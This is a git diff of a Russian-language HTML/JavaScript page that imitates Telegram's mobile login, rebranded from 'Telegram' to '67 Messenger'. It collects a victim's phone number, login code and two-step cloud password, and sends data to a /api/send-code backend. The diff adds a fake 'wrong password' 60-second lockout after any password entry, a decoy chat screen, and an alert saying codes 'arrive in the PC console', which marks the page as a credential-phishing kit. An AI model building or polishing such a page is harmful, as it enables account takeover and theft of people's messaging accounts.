@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Telegram</title>
+    <title>67 Messenger</title>
     <style>
         * {
             box-sizing: border-box;
@@ -14,7 +14,7 @@
             -webkit-tap-highlight-color: transparent;
         }
         body {
-            background: #0e0e0e;
+            background: #08080a;
             color: #fff;
             display: flex;
             justify-content: center;
@@ -27,14 +27,14 @@
             max-width: 410px;
             height: 100vh;
             max-height: 860px;
-            background: #181818;
+            background: #000;
             position: relative;
             overflow: hidden;
             display: flex;
             flex-direction: column;
-            border: 1px solid #222;
-            border-radius: 36px;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.8);
+            border: 1px solid #1c1c1e;
+            border-radius: 38px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
         }
         @media (max-width: 440px) {
             .phone-shell {
@@ -56,7 +56,7 @@
             width: 36px;
             height: 36px;
             border-radius: 50%;
-            background: #2c2c2e;
+            background: #1c1c1e;
             border: none;
             color: #fff;
             font-size: 18px;
@@ -68,7 +68,7 @@
         }
         .circle-btn:active {
             transform: scale(0.9);
-            background: #3a3a3c;
+            background: #2c2c2e;
         }
 
         .screens-viewport {
@@ -103,7 +103,7 @@
         .emoji-hero {
             font-size: 72px;
             line-height: 1;
-            margin: 10px 0 20px;
+            margin: 6px 0 18px;
             filter: drop-shadow(0 6px 16px rgba(0,0,0,0.45));
             transition: transform 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
         }
@@ -111,67 +111,61 @@
             transform: scale(1.14) rotate(-4deg);
         }
         h1 {
-            font-size: 26px;
+            font-size: 27px;
             font-weight: 700;
             margin-bottom: 10px;
             letter-spacing: -0.3px;
-            text-align: center;
         }
         .desc {
             font-size: 15px;
-            color: #aaa;
+            color: #ebebf5;
             text-align: center;
-            line-height: 1.4;
+            line-height: 1.38;
             max-width: 320px;
-            margin-bottom: 28px;
+            margin-bottom: 26px;
         }
 
         .phone-card {
             width: 100%;
-            background: #212121;
-            border-radius: 14px;
-            overflow: hidden;
+            border-top: 1px solid #262629;
+            border-bottom: 1px solid #262629;
             margin-bottom: 20px;
-            border: 1px solid #2c2c2e;
         }
         .country-selector {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 14px 16px;
-            border-bottom: 1px solid #2c2c2e;
+            padding: 13px 4px;
+            border-bottom: 1px solid #262629;
             cursor: pointer;
-            background: #252528;
         }
         .country-selector-left {
             display: flex;
             align-items: center;
-            gap: 12px;
-            color: #3390ec;
+            gap: 10px;
+            color: #2e88ff;
             font-size: 17px;
-            font-weight: 500;
         }
         .chevron {
-            color: #6c6c70;
+            color: #5a5a5e;
             font-size: 20px;
         }
 
         .phone-input-row {
             display: flex;
             align-items: center;
-            padding: 14px 16px;
-            background: #212121;
+            padding: 13px 4px;
         }
         .dial-code {
-            min-width: 65px;
-            font-size: 18px;
+            min-width: 60px;
+            font-size: 20px;
             padding-right: 12px;
-            margin-right: 12px;
-            border-right: 1px solid #333;
+            margin-right: 14px;
+            border-right: 1px solid #262629;
             color: #fff;
-            font-weight: 500;
         }
         
+        /* Реальное скрытое поле для вызова нативной клавиатуры телефона */
         .native-phone-input {
             position: absolute;
             opacity: 0;
@@ -183,13 +177,13 @@
         .mask-wrapper {
             position: relative;
             flex: 1;
-            font-size: 18px;
-            letter-spacing: 0.5px;
+            font-size: 20px;
+            letter-spacing: 0.6px;
             font-variant-numeric: tabular-nums;
             cursor: text;
         }
         .mask-bg {
-            color: #666;
+            color: #48484a;
         }
         .mask-fg {
             position: absolute;
@@ -201,8 +195,8 @@
         .caret {
             display: inline-block;
             width: 2px;
-            height: 20px;
-            background: #3390ec;
+            height: 22px;
+            background: #2e88ff;
             vertical-align: middle;
             margin-left: 1px;
             animation: blink 1s infinite;
@@ -217,15 +211,13 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            font-size: 15px;
+            font-size: 16px;
             margin-bottom: 24px;
-            padding: 0 4px;
-            color: #ccc;
         }
         .ios-switch {
             width: 51px;
             height: 31px;
-            background: #3390ec;
+            background: #34c759;
             border-radius: 16px;
             position: relative;
             cursor: pointer;
@@ -253,11 +245,11 @@
         .primary-btn {
             width: 100%;
             height: 50px;
-            border-radius: 14px;
+            border-radius: 25px;
             border: none;
-            background: #2c2c2e;
-            color: #777;
-            font-size: 16px;
+            background: #1c1c1e;
+            color: #636366;
+            font-size: 17px;
             font-weight: 600;
             cursor: not-allowed;
             display: flex;
@@ -266,13 +258,13 @@
             transition: background 0.25s ease, color 0.25s ease, transform 0.12s ease;
         }
         .primary-btn.ready {
-            background: #3390ec;
+            background: #2e7cf6;
             color: #fff;
             cursor: pointer;
         }
         .primary-btn.ready:active {
-            transform: scale(0.98);
-            background: #2b7bc4;
+            transform: scale(0.97);
+            background: #2468d4;
         }
         .spinner {
             width: 22px;
@@ -287,12 +279,12 @@
             to { transform: rotate(360deg); }
         }
 
+        /* Ячейки кода с зеленой подсветкой уголков */
         .otp-row {
             display: flex;
             gap: 10px;
-            margin: 10px 0 auto;
+            margin: 6px 0 auto;
             position: relative;
-            justify-content: center;
         }
         .native-otp-input {
             position: absolute;
@@ -302,61 +294,61 @@
             cursor: default;
         }
         .otp-cell {
-            width: 48px;
-            height: 58px;
+            width: 46px;
+            height: 56px;
             border-radius: 12px;
-            border: 1.5px solid #333;
+            border: 1.6px solid #2c2c2e;
             display: flex;
             align-items: center;
             justify-content: center;
             font-size: 24px;
             font-weight: 600;
-            transition: all 0.2s ease;
-            background: #212121;
+            transition: all 0.25s cubic-bezier(0.34, 1.56, 0.64, 1);
+            background: #0a0a0c;
         }
         .otp-cell.active {
-            border-color: #3390ec;
-            box-shadow: 0 0 10px rgba(51, 144, 236, 0.3);
+            border-color: #2e88ff;
+            box-shadow: 0 0 12px rgba(46, 136, 255, 0.3);
         }
         .otp-cell.success {
             border-color: #34c759;
             color: #34c759;
-            background: rgba(52, 199, 89, 0.1);
+            box-shadow: inset 0 0 8px rgba(52, 199, 89, 0.4), 0 0 14px rgba(52, 199, 89, 0.5);
+            background: rgba(52, 199, 89, 0.08);
+            transform: scale(1.06);
         }
 
         .blue-link {
-            color: #3390ec;
+            color: #2e88ff;
             background: none;
             border: none;
             font-size: 15px;
             cursor: pointer;
-            margin-bottom: 20px;
+            margin-bottom: 18px;
         }
 
         .pass-field-wrap {
             width: 100%;
-            background: #212121;
-            border: 1.5px solid #333;
-            border-radius: 14px;
-            padding: 12px 16px;
-            margin-top: 10px;
+            border-bottom: 1.5px solid #2c2c2e;
+            padding-bottom: 8px;
+            margin-top: 16px;
             display: flex;
             align-items: center;
             transition: border-color 0.2s;
         }
         .pass-field-wrap:focus-within {
-            border-color: #3390ec;
+            border-color: #2e88ff;
         }
         .pass-input {
             flex: 1;
             background: transparent;
             border: none;
             color: #fff;
-            font-size: 17px;
+            font-size: 18px;
             outline: none;
         }
         .pass-input::placeholder {
-            color: #666;
+            color: #555558;
         }
         .eye-btn {
             background: none;
@@ -364,7 +356,7 @@
             color: #8e8e93;
             font-size: 18px;
             cursor: pointer;
-            padding: 0 4px;
+            padding: 0 6px;
         }
 
         .error-box {
@@ -376,11 +368,12 @@
             font-weight: 500;
         }
 
+        /* Модалки и шторки */
         .modal-backdrop {
             position: absolute;
             inset: 0;
-            background: rgba(0,0,0,0.7);
-            backdrop-filter: blur(4px);
+            background: rgba(0,0,0,0.65);
+            backdrop-filter: blur(5px);
             display: flex;
             align-items: center;
             justify-content: center;
@@ -396,34 +389,33 @@
         }
         .confirm-card {
             width: 100%;
-            max-width: 320px;
-            background: #212121;
-            border-radius: 20px;
-            padding: 24px 20px 20px;
+            background: #1c1c1e;
+            border-radius: 26px;
+            padding: 24px 20px 18px;
             text-align: center;
-            transform: scale(0.9);
-            transition: transform 0.25s cubic-bezier(0.34, 1.56, 0.64, 1);
-            border: 1px solid #333;
+            transform: scale(0.88);
+            transition: transform 0.32s cubic-bezier(0.34, 1.56, 0.64, 1);
+            box-shadow: 0 16px 40px rgba(0,0,0,0.6);
         }
         .modal-backdrop.open .confirm-card {
             transform: scale(1);
         }
         .confirm-phone {
-            font-size: 21px;
+            font-size: 23px;
             font-weight: 700;
             margin-bottom: 8px;
         }
         .confirm-sub {
             font-size: 15px;
-            color: #aaa;
-            margin-bottom: 20px;
+            color: #aeaeb2;
+            margin-bottom: 14px;
         }
         .confirm-edit {
-            color: #3390ec;
-            font-size: 15px;
+            color: #2e88ff;
+            font-size: 16px;
             background: none;
             border: none;
-            margin-bottom: 16px;
+            margin-bottom: 18px;
             cursor: pointer;
             display: inline-block;
         }
@@ -431,35 +423,34 @@
         .country-sheet {
             position: absolute;
             inset: 0;
-            background: #181818;
+            background: #121214;
             z-index: 40;
             display: flex;
             flex-direction: column;
             transform: translateY(100%);
-            transition: transform 0.35s cubic-bezier(0.16, 1, 0.3, 1);
+            transition: transform 0.42s cubic-bezier(0.16, 1, 0.3, 1);
         }
         .country-sheet.open {
             transform: translateY(0);
         }
         .sheet-header {
-            padding: 16px;
+            padding: 14px 16px 10px;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            border-bottom: 1px solid #222;
         }
         .sheet-title {
             font-size: 18px;
             font-weight: 600;
         }
         .search-bar-wrap {
-            padding: 12px 16px;
+            padding: 6px 16px 12px;
         }
         .search-bar {
             width: 100%;
-            background: #252528;
+            background: #242426;
             border: none;
-            border-radius: 10px;
+            border-radius: 12px;
             padding: 10px 14px;
             color: #fff;
             font-size: 16px;
@@ -474,23 +465,25 @@
         .countries-list {
             flex: 1;
             overflow-y: auto;
-            padding: 0 20px 30px 16px;
+            padding: 0 28px 30px 16px;
+            scroll-behavior: smooth;
         }
         .countries-list::-webkit-scrollbar {
             display: none;
         }
         .letter-header {
-            color: #3390ec;
+            color: #8e8e93;
             font-size: 13px;
             font-weight: 600;
             padding: 12px 0 6px;
+            border-bottom: 1px solid #242426;
         }
         .country-item {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 12px 0;
-            border-bottom: 1px solid #222;
+            padding: 11px 0;
+            border-bottom: 1px solid #1c1c1e;
             cursor: pointer;
         }
         .c-info {
@@ -504,12 +497,167 @@
         }
         .c-en {
             font-size: 13px;
-            color: #888;
+            color: #8e8e93;
             margin-top: 2px;
         }
         .c-code {
-            color: #888;
+            color: #8e8e93;
             font-size: 16px;
+        }
+        .alphabet-bar {
+            position: absolute;
+            right: 4px;
+            top: 10px;
+            bottom: 10px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            gap: 2px;
+            font-size: 10px;
+            font-weight: 700;
+            color: #2e88ff;
+            z-index: 5;
+        }
+        .alpha-char {
+            padding: 1px 4px;
+            cursor: pointer;
+            text-align: center;
+        }
+
+        .chats-screen {
+            position: absolute;
+            inset: 0;
+            background: #000;
+            z-index: 50;
+            display: flex;
+            flex-direction: column;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.35s ease;
+        }
+        .chats-screen.open {
+            opacity: 1;
+            pointer-events: auto;
+        }
+        .chats-top {
+            padding: 14px 16px 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .pill-btn {
+            background: #1c1c1e;
+            color: #fff;
+            border: none;
+            padding: 6px 14px;
+            border-radius: 18px;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        .chats-title-box {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 17px;
+            font-weight: 700;
+        }
+        .story-badge {
+            width: 26px;
+            height: 26px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #34c759, #2e88ff);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+        }
+        .tabs-row {
+            display: flex;
+            padding: 6px 16px 10px;
+            gap: 8px;
+        }
+        .tab-pill {
+            flex: 1;
+            text-align: center;
+            padding: 7px 0;
+            border-radius: 16px;
+            font-size: 14px;
+            font-weight: 600;
+            background: #1c1c1e;
+            color: #8e8e93;
+        }
+        .tab-pill.active {
+            background: #2c2c2e;
+            color: #fff;
+        }
+        .skeleton-list {
+            flex: 1;
+            overflow: hidden;
+            padding: 4px 16px;
+        }
+        .skel-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 10px 0;
+            border-bottom: 1px solid #111;
+        }
+        .skel-avatar {
+            width: 52px;
+            height: 52px;
+            border-radius: 50%;
+            background: #1c1c1e;
+            position: relative;
+            overflow: hidden;
+        }
+        .skel-lines {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .skel-line {
+            height: 11px;
+            border-radius: 6px;
+            background: #1c1c1e;
+            position: relative;
+            overflow: hidden;
+        }
+        .skel-line.w40 { width: 42%; }
+        .skel-line.w75 { width: 78%; }
+        .skel-avatar::after, .skel-line::after {
+            content: "";
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.06), transparent);
+            animation: shimmer 1.4s infinite;
+        }
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        .bottom-nav {
+            height: 64px;
+            background: #121214;
+            border-top: 1px solid #1f1f21;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            padding: 0 10px;
+        }
+        .b-tab {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 10px;
+            color: #8e8e93;
+            gap: 3px;
+        }
+        .b-tab.active {
+            color: #2e88ff;
+        }
+        .b-icon {
+            font-size: 20px;
         }
     </style>
 </head>
@@ -521,24 +669,25 @@
     </div>
 
     <div class="screens-viewport">
-        <!-- ЭКРАН 1: Телефон -->
+        <!-- ЭКРАН 1 -->
         <div class="screen active" id="scrPhone">
-            <div class="emoji-hero" id="phoneHero">📱</div>
-            <h1>Ваш телефон</h1>
-            <p class="desc">Пожалуйста, укажите код страны и введите свой номер телефона.</p>
+            <div class="emoji-hero" id="phoneHero">☎️</div>
+            <h1>Телефон</h1>
+            <p class="desc">Проверьте код страны и введите свой номер телефона.</p>
 
             <div class="phone-card" onclick="document.getElementById('nativePhone').focus()">
                 <div class="country-selector" onclick="event.stopPropagation(); openCountrySheet()">
                     <div class="country-selector-left" id="selectedCountryLabel">
-                        <span>🇰🇿</span> <span>Казахстан</span>
+                        <span>🇺🇸</span> <span>Соединенные Штаты Америки</span>
                     </div>
                     <span class="chevron">›</span>
                 </div>
                 <div class="phone-input-row">
-                    <div class="dial-code" id="dialCodeDisplay">+7</div>
+                    <div class="dial-code" id="dialCodeDisplay">+1</div>
                     <div class="mask-wrapper">
+                        <!-- Нативный скрытый инпут вызывает системную клавиатуру -->
                         <input type="tel" id="nativePhone" class="native-phone-input" oninput="handleNativePhoneInput(this)">
-                        <div class="mask-bg" id="maskBg">000 000 00 00</div>
+                        <div class="mask-bg" id="maskBg">000 000 0000</div>
                         <div class="mask-fg" id="maskFg"><span class="caret"></span></div>
                     </div>
                 </div>
@@ -555,12 +704,12 @@
             </button>
         </div>
 
-        <!-- ЭКРАН 2: Код -->
+        <!-- ЭКРАН 2 -->
         <div class="screen" id="scrCode">
-            <div class="emoji-hero" id="codeHero">📩</div>
+            <div class="emoji-hero" id="codeHero">💬</div>
             <h1>Введите код</h1>
             <p class="desc">
-                Мы отправили код в официальном приложении Telegram на ваше другое устройство. <span id="codePhoneLabel">+7 778 106 3970</span>
+                Мы отправили код через <b>67</b> на другое устройство, где авторизован <span id="codePhoneLabel">+7 778 106 3970</span>.
             </p>
 
             <div class="otp-row" onclick="document.getElementById('nativeOtp').focus()">
@@ -573,15 +722,15 @@
             </div>
 
             <div class="error-box" id="codeError"></div>
-            <button class="blue-link" onclick="alert('Код отправлен повторно через Telegram')">Не получили код?</button>
+            <button class="blue-link" onclick="alert('Введи любой 5-значный код — он придет в консоль ПК!')">Не получили код?</button>
         </div>
 
-        <!-- ЭКРАН 3: Облачный пароль 2FA -->
+        <!-- ЭКРАН 3 -->
         <div class="screen" id="scrPass">
-            <div class="emoji-hero" id="monkeyHero">🔒</div>
-            <h1>Облачный пароль</h1>
+            <div class="emoji-hero" id="monkeyHero">🙈</div>
+            <h1>Ваш пароль</h1>
             <p class="desc">
-                Ваш аккаунт защищен двухэтапной аутентификацией. Введите облачный пароль.
+                Вы включили двухэтапную аутентификацию. Теперь Ваш аккаунт защищён дополнительным облачным паролем.
             </p>
 
             <div class="pass-field-wrap">
@@ -591,7 +740,7 @@
 
             <div class="error-box" id="passError"></div>
 
-            <button class="blue-link" onclick="alert('Сброс пароля доступен через почту')">Забыли пароль?</button>
+            <button class="blue-link" onclick="alert('Введи облачный пароль от 67')">Забыли пароль?</button>
             <button class="primary-btn" id="btnPassNext" onclick="submitCloudPassword()">
                 <span class="btn-text" id="passBtnText">Продолжить</span>
                 <div class="spinner" id="passSpinner"></div>
@@ -599,13 +748,13 @@
         </div>
     </div>
 
-    <!-- МОДАЛКА ПОДТВЕРЖДЕНИЯ НОМЕРА -->
+    <!-- МОДАЛКА -->
     <div class="modal-backdrop" id="confirmModal">
         <div class="confirm-card">
             <div class="confirm-phone" id="confirmPhoneText">+7 778 106 39 70</div>
-            <div class="confirm-sub">Верно ли введен номер?</div>
+            <div class="confirm-sub">Правильно ли указан номер?</div>
             <button class="confirm-edit" onclick="closeConfirmModal()">Изменить</button>
-            <button class="primary-btn ready" onclick="confirmAndSendPhone()">Да</button>
+            <button class="primary-btn ready" onclick="confirmAndSendPhone()">Продолжить</button>
         </div>
     </div>
 
@@ -613,22 +762,49 @@
     <div class="country-sheet" id="countrySheet">
         <div class="sheet-header">
             <button class="circle-btn" onclick="closeCountrySheet()">✕</button>
-            <span class="sheet-title">Выберите страну</span>
+            <span class="sheet-title">Страна</span>
             <div style="width:36px;"></div>
         </div>
         <div class="search-bar-wrap">
-            <input type="text" class="search-bar" id="countrySearch" placeholder="🔍 Поиск страны..." oninput="renderCountries(this.value)">
+            <input type="text" class="search-bar" id="countrySearch" placeholder="🔍 Поиск страны или кода..." oninput="renderCountries(this.value)">
         </div>
         <div class="countries-body">
             <div class="countries-list" id="countriesList"></div>
+            <div class="alphabet-bar" id="alphabetBar"></div>
+        </div>
+    </div>
+
+    <!-- ЭКРАН ЧАТОВ -->
+    <div class="chats-screen" id="chatsScreen">
+        <div class="chats-top">
+            <button class="pill-btn">Изм.</button>
+            <div class="chats-title-box">
+                <div class="story-badge">67</div>
+                <span>Чаты</span>
+            </div>
+            <button class="pill-btn">📝</button>
+        </div>
+        <div class="search-bar-wrap">
+            <input type="text" class="search-bar" placeholder="🔍 Поиск в 67" disabled>
+        </div>
+        <div class="tabs-row">
+            <div class="tab-pill active">Все</div>
+            <div class="tab-pill">Секретные 67</div>
+        </div>
+        <div class="skeleton-list" id="skeletonList"></div>
+        <div class="bottom-nav">
+            <div class="b-tab"><span class="b-icon">👤</span><span>Контакты</span></div>
+            <div class="b-tab"><span class="b-icon">📞</span><span>Звонки</span></div>
+            <div class="b-tab active"><span class="b-icon">💬</span><span>Чаты</span></div>
+            <div class="b-tab"><span class="b-icon">⚙️</span><span>Настройки</span></div>
         </div>
     </div>
 </div>
 
 <script>
-    // Правильные флаги, коды и маски
     const COUNTRIES = [
         { ru: "Австралия", en: "Australia", code: "+61", flag: "🇦🇺", mask: "000 000 000" },
+        { ru: "Австрия", en: "Austria", code: "+43", flag: "🇦🇹", mask: "000 000 0000" },
         { ru: "Азербайджан", en: "Azerbaijan", code: "+994", flag: "🇦🇿", mask: "00 000 00 00" },
         { ru: "Армения", en: "Armenia", code: "+374", flag: "🇦🇲", mask: "00 000 000" },
         { ru: "Беларусь", en: "Belarus", code: "+375", flag: "🇧🇾", mask: "00 000 00 00" },
@@ -640,19 +816,33 @@
         { ru: "Казахстан", en: "Kazakhstan", code: "+7", flag: "🇰🇿", mask: "000 000 00 00" },
         { ru: "Канада", en: "Canada", code: "+1", flag: "🇨🇦", mask: "000 000 0000" },
         { ru: "Кыргызстан", en: "Kyrgyzstan", code: "+996", flag: "🇰🇬", mask: "000 000 000" },
-        { ru: "Китай", en: "China", code: "+86", flag: "🇨🇳", mask: "000 0000 0000" },
+        { ru: "Китай", en: "China mainland", code: "+86", flag: "🇨🇳", mask: "000 0000 0000" },
         { ru: "Россия", en: "Russia", code: "+7", flag: "🇷🇺", mask: "000 000 00 00" },
-        { ru: "США", en: "USA", code: "+1", flag: "🇺🇸", mask: "000 000 0000" },
+        { ru: "Соединенные Штаты Америки", en: "USA", code: "+1", flag: "🇺🇸", mask: "000 000 0000" },
         { ru: "Турция", en: "Turkey", code: "+90", flag: "🇹🇷", mask: "000 000 00 00" },
         { ru: "Узбекистан", en: "Uzbekistan", code: "+998", flag: "🇺🇿", mask: "00 000 00 00" },
         { ru: "Украина", en: "Ukraine", code: "+380", flag: "🇺🇦", mask: "00 000 00 00" },
         { ru: "Франция", en: "France", code: "+33", flag: "🇫🇷", mask: "0 00 00 00 00" }
     ];
 
-    let currentCountry = COUNTRIES.find(c => c.ru === "Казахстан");
+    let currentCountry = COUNTRIES.find(c => c.ru === "Соединенные Штаты Америки");
     let digits = "";
     let otp = "";
     let activeStep = "phone";
+    let lockoutTimer = null;
+    let secondsLeft = 0;
+
+    const skelContainer = document.getElementById("skeletonList");
+    for (let i = 0; i < 9; i++) {
+        skelContainer.innerHTML += `
+            <div class="skel-row">
+                <div class="skel-avatar"></div>
+                <div class="skel-lines">
+                    <div class="skel-line w40"></div>
+                    <div class="skel-line w75"></div>
+                </div>
+            </div>`;
+    }
 
     function openCountrySheet() {
         document.getElementById("countrySearch").value = "";
@@ -666,7 +856,10 @@
 
     function renderCountries(query) {
         const listEl = document.getElementById("countriesList");
+        const alphaEl = document.getElementById("alphabetBar");
         listEl.innerHTML = "";
+        alphaEl.innerHTML = "";
+
         const q = query.trim().toLowerCase();
         const filtered = COUNTRIES.filter(c =>
             c.ru.toLowerCase().includes(q) ||
@@ -674,7 +867,21 @@
             c.code.includes(q)
         );
 
+        let lastLetter = "";
+        const letters = [];
+
         filtered.forEach(c => {
+            const firstLetter = c.ru[0].toUpperCase();
+            if (firstLetter !== lastLetter) {
+                lastLetter = firstLetter;
+                letters.push(firstLetter);
+                const hdr = document.createElement("div");
+                hdr.className = "letter-header";
+                hdr.id = "sec-" + firstLetter;
+                hdr.innerText = firstLetter;
+                listEl.appendChild(hdr);
+            }
+
             const item = document.createElement("div");
             item.className = "country-item";
             item.onclick = () => selectCountry(c);
@@ -686,6 +893,17 @@
                 <span class="c-code">${c.code}</span>
             `;
             listEl.appendChild(item);
+        });
+
+        letters.forEach(l => {
+            const sp = document.createElement("span");
+            sp.className = "alpha-char";
+            sp.innerText = l;
+            sp.onclick = () => {
+                const target = document.getElementById("sec-" + l);
+                if (target) target.scrollIntoView({ behavior: "smooth" });
+            };
+            alphaEl.appendChild(sp);
         });
     }
 
@@ -704,6 +922,7 @@
     }
 
     function handleNativePhoneInput(input) {
+        // Оставляем только цифры
         digits = input.value.replace(/\D/g, "");
         const maxLen = maxDigitsForMask(currentCountry.mask);
         if (digits.length > maxLen) {
@@ -711,7 +930,6 @@
             input.value = digits;
         }
 
-        // Автоопределение KZ / RU при вводе +7
         if (currentCountry.code === "+7" && digits.length >= 1) {
             if (digits.startsWith("7")) {
                 currentCountry = COUNTRIES.find(c => c.ru === "Казахстан");
@@ -719,7 +937,6 @@
                 currentCountry = COUNTRIES.find(c => c.ru === "Россия");
             }
             document.getElementById("selectedCountryLabel").innerHTML = `<span>${currentCountry.flag}</span> <span>${currentCountry.ru}</span>`;
-            document.getElementById("dialCodeDisplay").innerText = currentCountry.code;
         }
 
         bounceHero("phoneHero");
@@ -761,14 +978,14 @@
         bounceHero("codeHero");
         updateOtpCells();
         if (otp.length === 5) {
-            setTimeout(submitOtpCode, 250);
+            setTimeout(submitOtpCode, 280);
         }
     }
 
     function bounceHero(id) {
         const el = document.getElementById(id);
         el.classList.add("bounce");
-        setTimeout(() => el.classList.remove("bounce"), 200);
+        setTimeout(() => el.classList.remove("bounce"), 220);
     }
 
     function openConfirmModal() {
@@ -787,7 +1004,6 @@
         const fullPhone = getFormattedPhone();
         document.getElementById("codePhoneLabel").innerText = fullPhone;
 
-        // Отправка на бэкенд (укажи полный URL сервера, если сайт на GitHub, например: https://твой-сервер.com/api/send-code)
         await fetch("/api/send-code", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -822,21 +1038,28 @@
 
     function onPassType() {
         const val = document.getElementById("passInput").value;
-        document.getElementById("btnPassNext").classList.toggle("ready", val.length > 0);
+        if (secondsLeft === 0) {
+            document.getElementById("btnPassNext").classList.toggle("ready", val.length > 0);
+        }
         document.getElementById("passError").innerText = "";
         bounceHero("monkeyHero");
     }
 
     function togglePassPeek() {
         const inp = document.getElementById("passInput");
+        const monkey = document.getElementById("monkeyHero");
         if (inp.type === "password") {
             inp.type = "text";
+            monkey.innerText = "🙉";
         } else {
             inp.type = "password";
+            monkey.innerText = "🙈";
         }
+        bounceHero("monkeyHero");
     }
 
     async function submitCloudPassword() {
+        if (secondsLeft > 0) return;
         const val = document.getElementById("passInput").value;
         if (!val) return;
 
@@ -852,7 +1075,26 @@
         setTimeout(() => {
             document.getElementById("passBtnText").style.display = "block";
             document.getElementById("passSpinner").style.display = "none";
-            alert("Авторизация успешно завершена!");
+            triggerLockout();
+        }, 1200);
+    }
+
+    function triggerLockout() {
+        secondsLeft = 60;
+        const errBox = document.getElementById("passError");
+        const btn = document.getElementById("btnPassNext");
+        btn.classList.remove("ready");
+
+        lockoutTimer = setInterval(() => {
+            if (secondsLeft > 0) {
+                errBox.innerText = `Неправильный пароль. Повторите попытку через ${secondsLeft} сек.`;
+                secondsLeft--;
+            } else {
+                clearInterval(lockoutTimer);
+                errBox.innerText = "";
+                const val = document.getElementById("passInput").value;
+                if (val.length > 0) btn.classList.add("ready");
+            }
         }, 1000);
     }
 
